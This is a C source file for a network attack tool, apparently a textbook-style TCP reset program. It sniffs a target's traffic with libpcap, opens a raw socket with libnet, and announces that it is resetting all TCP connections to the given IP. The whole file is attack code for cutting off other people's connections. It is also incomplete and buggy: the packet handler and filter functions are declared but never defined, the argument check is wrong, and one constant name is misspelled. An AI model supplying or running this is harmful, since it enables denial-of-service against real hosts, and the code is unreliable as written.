#include <libnet.h>
#include <pcap.h>
#include "hacking.h"

void caught_packet(u_char *, const struct pcap_pkthdr *, const u_char *);
int set_packet_filter(pcap_t *, struct in_addr *);

struct data_pass{
    int libnet_handle;
    u_char *packet;
};

int main(int argc, char *argv[]){
    struct pcap_pkthdr cap_header;
    const u_char *packet, *pkt_data;
    pcap_t *pcap_handle;
    char errbuf[PCAP_BUF_SIZE]; // Same size as LIBNET_ERRBUF_SIZE
    char *device;
    u_long target_ip;
    int network;
    struct data_pass critical_libnet_data;

    if(argc < 1){
        printf("Usage: %s <target IP>\n", argv[0]);
        exit(0);
    }
    target_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE);

    if(target_ip == -1)
        fatal("Invalid target address");

    device = pcap_lookupdev(errbuf);
    if(device == NULL)
        fatal(errbuf);

    pcap_handle = pcap_open_live(device, 128, 1, 0, errbuf);
    if(pcap_handle == NULL)
        fatal(errbuf);

    critical_libnet_data.libnet_handle = libnet_open_raw_sock(IPPROTO_RAW);
    if(critical_libnet_data.libnet_handle == -1)
        libnet_error(LIBNER_ERR_FATAL, "can't open network interface. -- this program must run as root\n");

    libnet_init_packet(LIBNET_IP_H + LIBNET_TCP_H, &(critical_libnet_data.packet));
    if(critical_libnet_data.packet == -1)
        libnet_error(LIBNET_ERR_FATAL, "can't initialize packet memory.\n");

    libnet_seed_prand();

    set_packet_filter(pcap_handle, (struct in_addr *) &target_ip);

    printf("Resetting all TCP connections to %s on %s\n", argv[1], device);
    pcap_loop(pcap_handle, -1, caught_packet, (u_char *)&critical_libnet_data);

    pcap_close(pcap_handle);
}